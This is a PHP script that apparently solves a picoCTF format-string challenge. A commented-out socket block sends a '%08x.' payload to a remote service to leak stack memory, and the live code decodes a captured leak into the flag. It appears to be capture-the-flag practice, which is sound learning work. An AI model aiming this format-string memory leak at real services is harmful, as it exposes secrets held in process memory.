#!/usr/bin/php
<?php
/*
$s = fsockopen("157.245.41.162","32721");
if(!$s)
	die("Couldn't open socket");

$s = socket_create(AF_INET, SOCK_STREAM, 0);
socket_connect($s, "157.245.41.162","32721");
socket_write($s, "teste\n", 6);
socket_recv($s, $sim, 99999,0);
socket_write($s, "teste\n", 6);
socket_recv($s, $sim, 99999,0);
socket_recv($s, $sim, 99999,0);
socket_write($s, "2\n", 6);
socket_recv($s, $sim, 99999,0);
socket_write($s, "2\n", 6);
socket_recv($s, $sim, 99999,0);
socket_write($s, "1\n", 6);
socket_recv($s, $sim, 99999,0);
socket_recv($s, $sim, 99999,0);
socket_write($s, str_repeat('%08x.', 64)."\n",239);
socket_recv($s, $sim, 99999,0);
*/
$sim = "ffac21b0.f7d65a6c.8049346.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.f7f49d00.f7dcdd60.6f636970.7b465443.6b34334c.5f676e31.67346c46.";
$split = explode(".", $sim);
$s = '';
$flag = '';
foreach($split as $b){
	$s = str_split(join(array_reverse(str_split($b, 2))),2);
	foreach($s as $k)
		$flag .= chr(hexdec($k));
}
echo $flag;
